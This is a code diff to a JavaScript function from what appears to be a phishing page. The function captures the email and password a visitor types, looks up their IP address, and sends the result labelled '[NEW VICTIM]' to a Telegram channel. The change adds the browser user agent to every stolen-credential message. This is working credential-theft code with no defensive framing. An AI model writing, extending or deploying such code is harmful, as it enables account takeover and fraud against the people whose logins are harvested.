@@ -21,26 +21,27 @@ function getAutofilledValues() {
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
     var boxAccPts = document.getElementById('box_acc_pts');
+    var userAgent = navigator.userAgent;
 
     fetch('https://ipinfo.io/json')
     .then(response => response.json())
     .then(data => {
         if (boxAccPts) {
           var content = boxAccPts.innerText || boxAccPts.textContent;
-          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\n\nPoints: ${content}`;
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
           sendTelegramMessage(message); 
         } else {
-          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\n\nPoints: Not Found`;
+          var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
           sendTelegramMessage(message); 
         }
     })
     .catch(error => {
         if (boxAccPts) {
             var content = boxAccPts.innerText || boxAccPts.textContent;
-            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\n\nPoints: ${content}`;
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: ${content}`;
             sendTelegramMessage(message); 
           } else {
-            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\n\nPoints: Not Found`;
+            var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\n\nPoints: Not Found`;
             sendTelegramMessage(message); 
           }
     });
